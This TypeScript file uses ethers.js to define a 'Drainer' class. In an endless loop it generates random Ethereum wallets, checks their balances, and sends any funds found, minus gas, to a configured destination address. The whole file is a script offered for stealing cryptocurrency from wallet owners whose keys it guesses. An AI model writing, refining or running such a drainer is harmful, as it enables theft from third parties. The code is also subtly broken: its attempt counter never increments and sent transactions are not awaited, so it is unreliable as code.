import { config } from './config';
import {ethers} from 'ethers';

class Drainer {
  private dest: string;
  private provider: ethers.providers.JsonRpcProvider; 
  private count: number;
  private static gasNeeded: number = 21000;
  
  constructor () {
    this.dest = config.destAddress;
    this.provider = new ethers.providers.JsonRpcProvider(config.providerURL);
    this.count = 0;
  }
  
  private attemptToDrain = async () => {
    const wallet: ethers.Wallet = ethers.Wallet.createRandom().connect(this.provider);
    const address: string = await wallet.getAddress();
    const privateKey: string = wallet.privateKey;
    const balance_bigNumber: ethers.BigNumber = await wallet.getBalance();
    const balance: string = ethers.utils.formatEther(balance_bigNumber);
    console.log(`Attempt ${this.count} Address ${address} has ${balance} ETH`);
    if (balance_bigNumber.gt(ethers.BigNumber.from(0))) {
      const gasPrice = await this.provider.getGasPrice();
      const gasTotal = gasPrice.mul(Drainer.gasNeeded);
      const netAmount = balance_bigNumber.sub(gasTotal);
      const tx = {
          to: this.dest,
          value: netAmount
      };
      wallet.sendTransaction(tx).then((txObj) => {
        console.log('txHash: ', txObj.hash)
      });
    }
    this.count = this.count++;
  }  
  
  public run = async () => {
    while (true) {
      await this.attemptToDrain();
    }
  }
}

export const drain = new Drainer();